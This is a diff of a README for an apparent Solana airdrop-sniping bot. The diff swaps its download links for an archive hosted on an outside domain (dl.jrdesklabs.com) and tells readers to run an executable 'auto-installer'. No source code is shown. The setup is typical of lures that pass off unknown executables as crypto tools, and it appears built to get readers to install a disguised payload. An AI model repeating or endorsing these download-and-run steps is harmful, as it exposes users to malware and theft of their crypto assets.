@@ -8,9 +8,9 @@ Solana Airdrop Bot. This bot can snipe airdrop token for testing only, supports 
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/149fb342-ea17-47b5-943d-cebeaff5906d)
-](https://github.com/SABRY225/SilenceGen/releases/download/V3.2/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
-## **1. [Download the archive](https://github.com/SABRY225/SilenceGen/releases/download/V3.2/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 > [!TIP] 
 > - **High-Speed Data Analysis**: Utilizes Birdeye premium API for fast real-time data retrieval and analysis.
